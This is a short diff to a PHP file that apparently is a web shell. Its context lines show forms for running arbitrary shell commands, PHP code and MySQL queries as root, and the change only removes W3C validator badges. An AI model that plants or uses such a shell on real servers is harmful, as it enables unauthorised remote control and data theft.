@@ -69,10 +69,7 @@ if (!isset($_REQUEST["download"]) and !isset($_REQUEST["phpinfo"])) {
     echo "<form action=\"" . $phpself . "\" method=\"GET\"><b>Execute a shell command</b><br><input type=\"text\" name=\"cmd\" value=\"ps auxfww\"><input type=\"submit\" value=\"go\"></form><br>";
     echo "<form action=\"" . $phpself . "\" method=\"GET\"><b>Execute a PHP command</b><br><input type=\"text\" name=\"phpcode\" value=\"ini_get_all()\"><input type=\"submit\" value=\"go\"></form><br>";
     echo "<form action=\"" . $phpself . "\" method=\"GET\"><b>Execute a MySQL query</b><br>host: <input type=\"text\" name=\"host\" value=\"localhost\"><br>user: <input type=\"text\" name=\"user\" value=\"root\"><br>password: <input type=\"password\" name=\"password\"><br>query: <input type=\"text\" name=\"query\"><br><input type=\"submit\" value=\"execute\"></form><br>";
-    echo "<div style=\"text-align: center\">";
-    echo "<a href=\"http://validator.w3.org/check/referer\"><img src=\"http://www.w3.org/Icons/valid-html401\" border=\"0\" alt=\"Valid HTML 4.01!\"></a>";
-    echo "<a href=\"http://jigsaw.w3.org/css-validator/validator?text=" . $cssEncoded . "\"><img src=\"http://jigsaw.w3.org/css-validator/images/vcss\" border=\"0\" alt=\"Valid CSS!\"></a>";
-    echo "</div></div><div id=\"rightbody\">";
+    echo "</div><div id=\"rightbody\">";
 }
 
 if (isset($_REQUEST["sysinfo"])) {
